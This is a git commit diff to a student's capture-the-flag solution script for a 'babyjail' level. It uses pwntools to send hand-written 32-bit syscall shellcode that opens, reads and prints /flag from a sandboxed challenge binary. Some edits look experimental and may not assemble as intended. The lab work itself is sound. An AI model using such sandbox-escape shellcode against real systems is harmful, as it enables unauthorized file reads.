cee0ac8eee070a7c4a9a7cda0e887dd6840aa4be
Brandon <btphill4@asu.edu>
2022-09-21 22:17:27 -0700

    jail stuff

--- Notes and solutions/babyjail/jail9.py
+++ Notes and solutions/babyjail/jail9.py
@@ -9,42 +9,46 @@ pwn.context.encoding = "latin"
 # 4 - stat
 # 5 - fstat
 # 6 - lstat
-with pwn.process(["/challenge/babyjail_level9", "/"]) as target:
+# with pwn.process(["sudo", "strace","/challenge/babyjail_level9"]) as target:
+with pwn.process(["/challenge/babyjail_level9"]) as target:
+
     pwn.info(target.readrepeat(1))
 
     target.send(pwn.asm(f"""
-
     //open
     xor ecx, ecx
-    lea ebx, [rip+flag]
+    lea ebx, [eip+flag]
     mov eax, 5
+    nop
     int 0x80
 
     //read
+    xor ebx, ebx
     xor ecx, ecx
     xor edx, edx
-    mov ebx, eax
-    mov ecx, esp
+
+    //fd is saved in eax
+    mov ebx, eax    
+    lea ecx, [eip + root]
     mov edx, 100
     mov eax, 3
     int 0x80
 
+
     //write
     mov ebx, 1
-    mov ecx, esp
-    mov edx, eax
+    lea ecx, [eip+root]
+    //mov ecx, esp
+    mov edx, 100
     mov eax, 4
-    int 0x80
-
-    //close
-    mov ebx, eax 
-    mov eax, 6
     int 0x80
 
 
 flag:
-    .ascii "flag"
+    .string "/flag"
 
+root:
+    .string "/"
     """))
 
     pwn.info(target.readrepeat(1))
